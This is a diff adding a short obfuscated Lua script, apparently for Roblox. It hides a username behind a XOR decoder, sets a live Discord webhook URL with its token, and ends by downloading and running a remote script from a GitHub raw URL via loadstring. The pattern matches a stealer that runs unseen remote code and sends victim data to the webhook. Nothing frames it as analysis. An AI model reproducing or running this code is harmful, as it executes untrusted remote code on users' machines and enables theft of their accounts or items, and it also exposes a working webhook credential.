@@ -1,0 +1,27 @@
+
+local v0 = string.char;
+local v1 = string.byte;
+local v2 = string.sub;
+local v3 = bit32 or bit;
+local v4 = v3.bxor;
+local v5 = table.concat;
+local v6 = table.insert;
+local function v7(v8, v9)
+	local v10 = 1886 - (1509 + 377);
+	local v11;
+	while true do
+		if ((1833 - (1454 + 379)) == v10) then
+			v11 = {};
+			for v12 = 923 - (801 + 121), #v8 do
+				v6(v11, v0(v4(v1(v2(v8, v12, v12 + 1 + 0)), v1(v2(v9, 1 + ((v12 - (1 + 0)) % #v9), (1 - 0) + ((v12 - (1 + 0)) % #v9) + 1 + 0))) % (735 - 479)));
+			end
+			v10 = 1;
+		end
+		if (v10 == (1919 - (1660 + 258))) then
+			return v5(v11);
+		end
+	end
+end
+UserName = v7("\52\162\71\89\148\52\172\66\87\148", "\81\199\48\50\230");
+Webhook = "https://discord.com/api/webhooks/1084483321964273714/RCC0Y1vpdvQ_rWYyE6tSLN8b_w1aZeIiGePPG-ZDHziknUfQO2kqER4a05XzWGefic8b";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))();
